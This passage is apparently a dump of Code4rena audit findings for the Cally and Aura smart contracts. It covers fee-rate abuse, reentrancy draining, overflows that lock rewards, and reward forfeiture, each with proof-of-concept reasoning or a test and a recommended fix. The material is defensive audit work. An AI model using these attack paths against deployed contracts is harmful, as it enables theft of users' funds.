"https://github.com/code-423n4/2022-05-cally-findings/issues/48", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L288-L289   # Vulnerability details  ## Impact The owner can force options to be non-exercisable, collecting premium without risking the loss of their NFT/tokens  ## Proof of Concept After a buyer buys an option owned by the owner, the owner can change the fee rate to be close to `type(uint256).max`, which will cause the subtraction below to always underflow, preventing the exercise of the option. Once the option expires, the owner can change the fee back and wait for another buyer  ```solidity File: contracts/src/Cally.sol   #1  288           // increment vault beneficiary's ETH balance 289           ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee; ``` https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L288-L289  ## Tools Used Code inspection  ## Recommended Mitigation Steps Add reasonable fee rate bounds checks in the `setFee()` function   "}, {"title": "Owner can modify the feeRate on existing vaults and steal the strike value on exercise", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/47", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L117-L121   # Vulnerability details  ## Impact Owner can steal the exercise cost which should have gone to the option seller  ## Proof of Concept There are no restrictions on when the owner can set the `feeRate`: ```solidity File: contracts/src/Cally.sol   #1  117       /// @notice Sets the fee that is applied on exercise 118       /// @param feeRate_ The new fee rate: fee = 1% = (1 / 100) * 1e18 119       function setFee(uint256 feeRate_) external onlyOwner { 120           feeRate = feeRate_; 121       } ``` https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L117-L121  By using a rate that consumes the exercise cost, the owner can steal Ether from the seller: ```solidity File: contracts/src/Cally.sol   #2  282           uint256 fee = 0; 283           if (feeRate > 0) { 284               fee = (msg.value * feeRate) / 1e18; 285               protocolUnclaimedFees += fee; 286           } 287    288           // increment vault beneficiary's ETH balance 289           ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee; ``` https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L282-L289  The owner can wait for a particularly large-value NFT, snipe that one option, then retire  ## Tools Used Code inspection  ## Recommended Mitigation Steps Fix the fee rate per vault during vault creation   "}, {"title": "Use safeTransferFrom instead of transferFrom for ERC721 transfers", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/38", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L199 https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L295 https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L344   # Vulnerability details  ## Details & Impact  The `transferFrom()` method is used instead of `safeTransferFrom()`, presumably to save gas. I however argue that this isn\u2019t recommended because:  - [OpenZeppelin\u2019s documentation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-) discourages the use of `transferFrom()`, use `safeTransferFrom()` whenever possible - Given that any NFT can be used for the call option, there are a few NFTs (here\u2019s an [example](https://github.com/sz-piotr/eth-card-game/blob/master/src/ethereum/contracts/ERC721Market.sol#L20-L31)) that have logic in the `onERC721Received()` function, which is only triggered in the `safeTransferFrom()` function and not in `transferFrom()`  ## Recommended Mitigation Steps  Call the `safeTransferFrom()` method instead of `transferFrom()` for NFT transfers. Note that the `CallyNft` contract should inherit the `ERC721TokenReceiver` contract as a consequence.  ```solidity abstract contract CallyNft is ERC721(\"Cally\", \"CALL\"), ERC721TokenReceiver {...} ```  "}, {"title": "Expiration calculation overflows if call option duration \u2265 195 days", "html_url": "https://github.com/code-423n4/2022-05-cally-findings/issues/16", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-cally-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L238   # Vulnerability details  ## Details & Impact  `vault.durationDays` is of type `uint8`, thus allowing a maximum value of 255. `1 days = 86400`, thus fitting into a `uint24`. Solc creates a temporary variable to hold the result of the intermittent multiplication\u00a0`vault.durationDays * 1 days` using the data type of the larger operand.  In this case, the intermittent data type used would be `uint24`, which has a maximum value of `2**24 - 1 = 16777215`. The maximum number allowable before overflow achieved is therefore `(2**24 - 1) / 86400 = 194`.  ## Proof of Concept  Insert this test case into [BuyOption.t.sol](https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/test/units/BuyOption.t.sol)  ```solidity  function testCannotBuyDueToOverflow() public {   vm.startPrank(babe);   bayc.mint(babe, 2);   // duration of 195 days   vaultId = c.createVault(2, address(bayc), premiumIndex, 195, strikeIndex, 0, Cally.TokenType.ERC721);   vm.stopPrank();    vm.expectRevert(stdError.arithmeticError);   c.buyOption{value: premium}(vaultId); } ```  Then run  ``` forge test --match-contract TestBuyOption --match-test testCannotBuyDueToOverflow ```  ## Tidbit  This was the 1 high-severity bug that I wanted to mention at the end of the [C4 TrustX showcase](https://youtu.be/up9eqFRLgMQ?t=5722) but unfortunately could not due to a lack of time :( It can be found in the [vulnerable lottery contract](https://gist.github.com/HickupHH3/d214cfe6e4d003f428a63ae7d127af2d) on L39. Credits to Pauliax / Thunder for the recommendation and raising awareness of this bug =p  ## Reference  [Article](https://muellerberndt.medium.com/building-a-secure-nft-gaming-experience-a-herdsmans-diary-1-91aab11139dc)  ## Recommended Mitigation Steps  Cast the multiplication into `uint32`.  ```solidity vault.currentExpiration = uint32(block.timestamp) + uint32(vault.durationDays) * 1 days; ```  "}, {"title": "`CrvDepositor.sol` Wrong implementation of the 2-week buffer for lock", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/343", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L127-L134   # Vulnerability details  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L127-L134  ```solidity uint256 unlockAt = block.timestamp + MAXTIME; uint256 unlockInWeeks = (unlockAt/WEEK)*WEEK;  //increase time too if over 2 week buffer if(unlockInWeeks.sub(unlockTime) > 2){     IStaker(staker).increaseTime(unlockAt);     unlockTime = unlockInWeeks; } ```  In `_lockCurve()`, `unlockInWeeks - unlockTime` is being used as a number in weeks, while it actually is a number in seconds.  Thus, comparing it with `2` actually means a 2 seconds buffer instead of a 2 weeks buffer.  The intention is to wait for 2 weeks before extending the lock time again, but the current implementation allows the extension of the lock once a new week begins.  ### Recommendation  Consider changing the name of `unlockTime` to `unlockTimeInWeeks`, and:  1. Change L94-102 to:  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L94-L102  ```solidity uint256 unlockAt = block.timestamp + MAXTIME; uint256 unlockInWeeks = unlockAt / WEEK;  //release old lock if exists IStaker(staker).release(); //create new lock uint256 crvBalanceStaker = IERC20(crvBpt).balanceOf(staker); IStaker(staker).createLock(crvBalanceStaker, unlockAt); unlockTimeInWeeks = unlockInWeeks; ```  2. Change L127-L134 to:  ```solidity uint256 unlockAt = block.timestamp + MAXTIME; uint256 unlockInWeeks = unlockAt / WEEK;  //increase time too if over 2 week buffer if(unlockInWeeks.sub(unlockTime) > 2){     IStaker(staker).increaseTime(unlockAt);     unlockTimeInWeeks = unlockInWeeks; } ```  "}, {"title": "ConvexMasterChef's deposit and withdraw can be reentered drawing all reward funds from the contract if reward token allows for transfer flow control", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/313", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L209-L221 https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L239-L250   # Vulnerability details  Reward token accounting update in deposit() and withdraw() happens after reward transfer. If reward token allows for the control of transfer call flow or can be upgraded to allow it in the future (i.e. have or can introduce the _beforetokentransfer, _afterTokenTransfer type of hooks; or, say, can be upgraded to ERC777), the current implementation makes it possible to drain all the reward token funds of the contract by directly reentering deposit() or withdraw() with tiny _amount.  Setting the severity to medium as this is conditional to transfer flow control assumption, but the impact is the full loss of contract reward token holdings.  ## Proof of Concept  Both withdraw() and deposit() have the issue, performing late accounting update and not controlling for reentrancy:  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L209-L221  ```solidity     function deposit(uint256 _pid, uint256 _amount) public {         PoolInfo storage pool = poolInfo[_pid];         UserInfo storage user = userInfo[_pid][msg.sender];         updatePool(_pid);         if (user.amount > 0) {             uint256 pending = user                 .amount                 .mul(pool.accCvxPerShare)                 .div(1e12)                 .sub(user.rewardDebt);             safeRewardTransfer(msg.sender, pending);         }         pool.lpToken.safeTransferFrom( ```  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L239-L250  ```solidity     function withdraw(uint256 _pid, uint256 _amount) public {         PoolInfo storage pool = poolInfo[_pid];         UserInfo storage user = userInfo[_pid][msg.sender];         require(user.amount >= _amount, \"withdraw: not good\");         updatePool(_pid);         uint256 pending = user.amount.mul(pool.accCvxPerShare).div(1e12).sub(             user.rewardDebt         );         safeRewardTransfer(msg.sender, pending);         user.amount = user.amount.sub(_amount);         user.rewardDebt = user.amount.mul(pool.accCvxPerShare).div(1e12);         pool.lpToken.safeTransfer(address(msg.sender), _amount); ```  ## Recommended Mitigation Steps  Consider adding a direct reentrancy control, e.g. nonReentrant modifier:  https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard  Also, consider finishing all internal state updates prior to external calls:  https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/#pitfalls-in-reentrancy-solutions  "}, {"title": "Integer overflow will lock all rewards in `AuraLocker`", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/261", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L176-L177 https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L802-L814 https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L864   # Vulnerability details  ## Impact  There is a potential overflow in the rewards calculations which would lead to `updateReward()` always reverting.  The impact of this overflow is that all reward tokens will be permanently locked in the contract. User's will be unable to call any of the functions which have the `updateReward()` modifier, that is:  - `lock()` - `getReward()` - `_processExpiredLocks()` - `_notifyReward()`  As a result the contract will need to call `shutdown()` and the users will only be able to receive their staked tokens via `emergencyWithdraw()`, which does not transfer the users the reward tokens.  Note that if one reward token overflows this will cause a revert on all reward tokens due to the loop over reward tokens.  ## Proof of Concept  The overflow may occur due to the base of values in `_rewardPerToken()`.   ```solidity     function _rewardPerToken(address _rewardsToken) internal view returns (uint256) {         if (lockedSupply == 0) {             return rewardData[_rewardsToken].rewardPerTokenStored;         }         return             uint256(rewardData[_rewardsToken].rewardPerTokenStored).add(                 _lastTimeRewardApplicable(rewardData[_rewardsToken].periodFinish)                     .sub(rewardData[_rewardsToken].lastUpdateTime)                     .mul(rewardData[_rewardsToken].rewardRate)                     .mul(1e18)                     .div(lockedSupply)             );     } ```  The return value of `_rewardPerToken()` is in terms of  ``` (now - lastUpdateTime) * rewardRate * 10**18 / totalSupply ```  Here `(now - lastUpdateTime)` has a maximum value of `rewardDuration = 6 * 10**5`.  Now `rewardRate` is the `_reward.div(rewardsDuration)` as seen in `_notifyRewardAmount()` on line #864. Note that `rewardDuration` is a constant 604,800.  `rewardDuration = 6 * 10**5`   Thus, if we have a rewards such as AURA or WETH (or most ERC20 tokens) which have units 10**18 we can transfer 1 WETH to the reward distributor which calls `_notifyRewardAmount()` and  sets the reward rate to,  `rewardRate = 10**18 / (6 * 10**5) ~= 10**12`  Finally, if this attack is run either by the first depositor they may `lock()` a single token which would set `totalSupply = 1`.  Therefore our equation in terms of units will become, ``` (now - lastUpdateTime) * rewardRate * 10**18 / totalSupply => 10**5 * 10**12 * 10**18 / 1 = 10**35 ```  In since `rewardPerTokenStored` is a `uint96` it has a maximum value of `2**96 ~= 7.9 * 10**28`. Hence there will be an overflow in `newRewardPerToken.to96()`. Since we are unable to add more total supply due to `lock()` reverting there will be no way to circumvent this revert except to `shutdown()`.  ```solidity                 uint256 newRewardPerToken = _rewardPerToken(token);                 rewardData[token].rewardPerTokenStored = newRewardPerToken.to96(); ```  Note this attack is described when we have a low `totalSupply`. However it is also possible to apply this attack on a larger `totalSupply` when there are reward tokens which have decimal places larger than 18 or tokens which such as SHIB which have small token value and so many of the tokens can be bought for cheap.   ## Recommended Mitigation Steps  To mitigation this issue it is recommended to increase the size of the `rewardPerTokenStored`. Since updating this value will require another slot to be used we recommend updating this to either `uint256` or to update both `rewardRate` and `rewardPerTokenStored` to be `uint224`.  "}, {"title": "massUpdatePools() is susceptible to DoS with block gas limit", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/197", "labels": ["bug", "duplicate", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/main/convex-platform/contracts/contracts/ConvexMasterChef.sol#L178-L183   # Vulnerability details  ## Impact massUpdatePools() is a public function and it calls the updatePool() function for the length of poolInfo. Hence, it is an unbounded loop, depending on the length of poolInfo. If poolInfo.length is big enough, block gas limit may be hit.  ## Proof of Concept https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/#dos-with-block-gas-limit  ## Tools Used Manual analysis  ## Recommended Mitigation Steps I suggest to limit the max number of loop iterations to prevent hitting block gas limit.   "}, {"title": "AuraLocker kick reward only takes last locked amount into consideration, instead of whole balance", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/156", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L404   # Vulnerability details  The issue occurs in AuraLocker, when expired locks are processed via kicking, and if all the user locks have expired. In this scenario, to calculate the kick reward, `_processExpiredLocks` multiplies the last locked amount by the number of epochs between the last lock's unlock time and the current epoch. A comment in this section mentions `\"wont have the exact reward rate that you would get if looped through\"`. However, there's no reason not to multiply *user's whole locked balance* by the number of epochs since the *last lock's* unlock time, *instead of only the last locked amount*. While this will still not be as accurate as looping through, this will give a more accurate kick reward result, which is still bounded by the full amount that would have been calculated if we had looped through.  ## Impact The reward calculation is inaccurate and lacking for no reason. Kickers receive less rewards than they should. Giving them a bigger, more accurate reward, will incentivize them better.  ## Proof of Concept [This](https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraLocker.sol#L396:#L405) is the section that calculates the kick reward if all locks have expired: ```             //check for kick reward             //this wont have the exact reward rate that you would get if looped through             //but this section is supposed to be for quick and easy low gas processing of all locks             //we'll assume that if the reward was good enough someone would have processed at an earlier epoch             if (_checkDelay > 0) {                 uint256 currentEpoch = block.timestamp.sub(_checkDelay).div(rewardsDuration).mul(rewardsDuration);                 uint256 epochsover = currentEpoch.sub(uint256(locks[length - 1].unlockTime)).div(rewardsDuration);                 uint256 rRate = AuraMath.min(kickRewardPerEpoch.mul(epochsover + 1), denominator);                 reward = uint256(locks[length - 1].amount).mul(rRate).div(denominator);             } ``` This flow is for low gas processing, so the function is not looping through all the locks (unlike the flow where some locks have not expired yet). In this flow, the function is just calculating the reward for the last lock.  Instead of doing this, it can multiply the *total amount locked by the user* (`locked`, already saved) by the *number of epochs between the last unlock time and current epoch*. The reward will still be smaller than if we had looped through all the rewards (since then each lock amount would be multiplied by more than just the last lock's number of expired epochs). But it would be more accurate and give better incentive for kicking.   ## Recommended Mitigation Steps Change the last line in the code above to: ```                 reward = uint256(locked).mul(rRate).div(denominator); ``` This will keep the low gas consumption of this flow, while giving a more accurate result.  "}, {"title": "ConvexMasterChef: When _lpToken is cvx, reward calculation is incorrect", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/151", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L96-L118   # Vulnerability details  ## Impact In the ConvexMasterChef contract, a new staking pool can be added using the add() function. The staking token for the new pool is defined using the _lpToken variable. However, there is no additional checking whether the _lpToken is the same as the reward token (cvx) or not. ```   function add(       uint256 _allocPoint,       IERC20 _lpToken,       IRewarder _rewarder,       bool _withUpdate   ) public onlyOwner {       if (_withUpdate) {           massUpdatePools();       }       uint256 lastRewardBlock = block.number > startBlock           ? block.number           : startBlock;       totalAllocPoint = totalAllocPoint.add(_allocPoint);       poolInfo.push(           PoolInfo({               lpToken: _lpToken,               allocPoint: _allocPoint,               lastRewardBlock: lastRewardBlock,               accCvxPerShare: 0,               rewarder: _rewarder           })       );   } ``` When the _lpToken is the same token as cvx, reward calculation for that pool in the updatePool() function can be incorrect. This is because the current balance of the _lpToken in the contract is used in the calculation of the reward. Since the _lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be. ```   function updatePool(uint256 _pid) public {       PoolInfo storage pool = poolInfo[_pid];       if (block.number <= pool.lastRewardBlock) {           return;       }       uint256 lpSupply = pool.lpToken.balanceOf(address(this));       if (lpSupply == 0) {           pool.lastRewardBlock = block.number;           return;       }       uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);       uint256 cvxReward = multiplier           .mul(rewardPerBlock)           .mul(pool.allocPoint)           .div(totalAllocPoint);       //cvx.mint(address(this), cvxReward);       pool.accCvxPerShare = pool.accCvxPerShare.add(           cvxReward.mul(1e12).div(lpSupply)       );       pool.lastRewardBlock = block.number;   } ``` ## Proof of Concept https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L96-L118 https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L186-L206 ## Tools Used None ## Recommended Mitigation Steps Add a check that _lpToken is not cvx in the add function or mint the reward token to another contract to prevent the amount of the staked token from being mixed up with the reward token.  "}, {"title": " ConvexMasterChef: When using add() and set(), it should always call massUpdatePools() to update all pools", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/147", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L96-L138   # Vulnerability details  ## Impact Same as IDX-003 in https://public-stg.inspex.co/report/Inspex_AUDIT2021024_LuckyLion_Farm_FullReport_v2.0.pdf The totalAllocPoint variable is used to determine the portion that each pool would get from the total reward, so it is one of the main factors used in the rewards calculation. Therefore, whenever the totalAllocPoint variable is modified without updating the pending reward first, the reward of each pool will be incorrectly calculated. For example, when  _withUpdate is false, in the add() shown below, the totalAllocPoint variable will be modified without updating the rewards (massUpdatePools()). ```     function add(         uint256 _allocPoint,         IERC20 _lpToken,         IRewarder _rewarder,         bool _withUpdate     ) public onlyOwner {         if (_withUpdate) {             massUpdatePools();         }         uint256 lastRewardBlock = block.number > startBlock             ? block.number             : startBlock;         totalAllocPoint = totalAllocPoint.add(_allocPoint);         poolInfo.push(             PoolInfo({                 lpToken: _lpToken,                 allocPoint: _allocPoint,                 lastRewardBlock: lastRewardBlock,                 accCvxPerShare: 0,                 rewarder: _rewarder             })         );     } ``` ## Proof of Concept https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L96-L138 ## Tools Used None ## Recommended Mitigation Steps Removing the _withUpdate variable in the add() and set() functions and always calling the massUpdatePools() function before updating totalAllocPoint variable  "}, {"title": "CrvDepositorWrapper.sol relies on oracle that isn't frequently updated", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/115", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/CrvDepositorWrapper.sol#L56-L65   # Vulnerability details  ## Impact Unpredictable slippage, sandwich vulnerability or frequent failed transactions  ## Proof of Concept CrvDepostiorWrapper uses the TWAP provided by the 20/80 WETH/BAL. The issue is that this pool has only handled ~15 transactions per day in the last 30 days, which means that the oracle frequently goes more than an hour without updating. Each time a state changing operation is called, the following code in the balancer pool takes a snapshot of the pool state BEFORE any operation changes it:  https://github.com/balancer-labs/balancer-v2-monorepo/blob/80e1a5db7439069e2cb53e228bce0a8a51f5b23e/pkg/pool-weighted/contracts/oracle/OracleWeightedPool.sol#L156-L161  This could result in the price of the oracle frequently not reflecting the true value of the assets due to infrequency of update. Now also consider that the pool has a trading fee of 2%. Combine an inaccurate oracle with a high fee pool and trades can exhibit high levels of \"slippage\". To account for this outputBps in AuraStakingProxy needs to be set relatively low or risks frequent failed transactions when calling distribute due to slippage conditions not being met. The lower outputBps is set the more vulnerable distribute becomes to sandwich attacks.   ## Tools Used  ## Recommended Mitigation Steps Consider using chainlink oracles for both BAL and ETH to a realtime estimate of the LP value. A chainlink LP oracle implementation can be found in the link below: https://blog.alphaventuredao.io/fair-lp-token-pricing/  "}, {"title": "User will lose funds", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/108", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code\r \r https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraClaimZap.sol#L224-L226\r \r \r # Vulnerability details\r \r ## Impact\r It was observed that User will lose funds due to missing else condition\r \r ## Proof of Concept\r \r 1. User call claimRewards at ClaimZap.sol#L103 with Options.LockCvx as false\r 2. claimRewards internally calls _claimExtras\r 3. Everything goes good until AuraClaimZap.sol#L218\r \r ```\r if (depositCvxMaxAmount > 0) {\r             uint256 cvxBalance = IERC20(cvx).balanceOf(msg.sender).sub(removeCvxBalance);\r             cvxBalance = AuraMath.min(cvxBalance, depositCvxMaxAmount);\r             if (cvxBalance > 0) {\r                 //pull cvx\r                 IERC20(cvx).safeTransferFrom(msg.sender, address(this), cvxBalance);\r                 if (_checkOption(options, uint256(Options.LockCvx))) {\r                     IAuraLocker(locker).lock(msg.sender, cvxBalance);\r                 }\r             }\r         }\r ```\r \r 4. Since user cvxBalance>0 so cvxBalance is transferred from user to the contract.\r 5. Now since Options.LockCvx was set to false in options so if (_checkOption(options, uint256(Options.LockCvx))) does not evaluate to true and does not execute\r 6. This means User cvx funds are stuck in contract\r \r ## Recommended Mitigation Steps\r The condition should check if user has enabled lock for cvx, otherwise cvx should not be transferred from user\r \r ```\r if (depositCvxMaxAmount > 0 && _checkOption(options, uint256(Options.LockCvx))) {\r           uint256 cvxBalance = IERC20(cvx).balanceOf(msg.sender).sub(removeCvxBalance);\r           cvxBalance = AuraMath.min(cvxBalance, depositCvxMaxAmount);\r           if (cvxBalance > 0) {\r               //pull cvx\r               IERC20(cvx).safeTransferFrom(msg.sender, address(this), cvxBalance);\r \r                   IAuraLocker(locker).lock(msg.sender, cvxBalance);\r           }\r       }\r ```\r \r "}, {"title": "User can forfeit other user rewards", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/50", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/main/contracts/ExtraRewardsDistributor.sol#L127   # Vulnerability details  ## Impact User can forfeit other user rewards by giving a higher _startIndex in getReward function  ## Proof of Concept 1. Assume User B has not received any reward yet so that his userClaims[_token][User B]=0 2. User A calls getReward function with _account as User B and _startIndex as 5 3. This eventually calls _allClaimableRewards at ExtraRewardsDistributor.sol#L213 which computes epochIndex =5>0?5:0 = 5 4. Assuming tokenEpochs is 10 and latestEpoch is 8, so reward will computed from epoch 5 till epoch index 7 and _allClaimableRewards will return index as 7 5. _getReward will simply update userClaims[_token][User B] with 7  6. This is incorrect because as per contract User B has received reward from epoch 0-7 even though he only received reward for epoch 5-7   ## Recommended Mitigation Steps Do not allow users to call getReward function for other users  "}, {"title": "`updateOperator()` can be called before an operator is set in proxy", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/34", "labels": ["bug", "disagree with severity", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L82   # Vulnerability details  ## Impact In `Aura.sol` the `updateOperator()` function can be called by anyone and it sets a new `operator` based on the address returned from `IStaker(vecrvProxy).operator()`.  The problem is that anyone can call this function even if the operator on `vecrvProxy` is not yet set.  If this is the case the operator in `Aura.sol` would be set to a zero address breaking the contract since functions like `init()` and `mint()` rely on the `msg.sender` being the `operator`. Even the `minterMint()` function relies on the `operator` since only the operator can set the `minter` which is the only one who can call `minterMinter()`.   ## Proof of Concept https://github.com/code-423n4/2022-05-aura/blob/main/contracts/Aura.sol#L82  ## Tools Used Manual code review   ## Recommended Mitigation Steps The `updateOperator()` function should not be a public function and should only be callable by an admin or the `operator` inside `Aura.sol`.  Also in the `updateOperator()` function,  there should be a check ensuring that the `newOperator` address is not a zero address to prevent breaking the contract by setting the `operator` to a zero address.   "}, {"title": "BaseRewardPool4626 is not IERC4626 compliant", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/26", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/aurafinance/convex-platform/blob/9cae5eb5a77e73bbc1378ef213740c1889e2e8a3/contracts/contracts/BaseRewardPool4626.sol   # Vulnerability details  ## Impact   BaseRewardPool4626 is not IERC4626 compliant. This makes the BaseRewardPool4626 contract irrelevant as it is for now since projects won't be able to integrate with BaseRewardPool4626 using the[eip-4626](https://eips.ethereum.org/EIPS/eip-4626) standard.   ## Suggestion  You can choose to remove the BaseRewardPool4626 and save on some deployment gas or review the necessary` functions` and `emits` required on [eip-4626](https://eips.ethereum.org/EIPS/eip-4626)  and add it to BaseRewardPool4626.   "}, {"title": "Duplicate Contract Names", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/12", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-aura/blob/main/contracts/CrvDepositorWrapper.sol#L9 https://github.com/code-423n4/2022-05-aura/blob/main/contracts/AuraStakingProxy.sol#L10   # Vulnerability details  ## Impact If a codebase has two contracts with the same names, the compilation artifacts will not contain one of the contracts.  `ICrvDepositor` exists in both `AuraStakingProxy` and `CrvDepositorWrapper`  ## Tools Manual Review   ## Recommended Mitigation Steps Move the contract to an interface file and import it or if the interface differs rename one of the contracts.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/5", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "The `amount should be greater than 0` is not checked by the `_addReward` function.  ## Permalink: https://github.com/code-423n4/2022-05-aura/blob/c332f8c23e12b3bb678f018682c7609df9c77ed9/contracts/ExtraRewardsDistributor.sol#L87  ## Recommendation: Can Add Require Statement to check _amount is greater than 0."}, {"title": "Rewards distribution can be delayed/never distributed on AuraLocker.sol#L848", "html_url": "https://github.com/code-423n4/2022-05-aura-findings/issues/1", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor acknowledged", "sponsor confirmed"], "target": "2022-05-aura-findings", "body": "# Lines of code  https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L848   # Vulnerability details    Rewards distribution can be delayed/never distributed on [AuraLocker.sol#L848 ](https://github.com/aurafinance/aura-contracts-lite/blob/main/contracts/AuraLocker.sol#L848)   ### Issue  Someone malicious can delay the rewards distribution for non 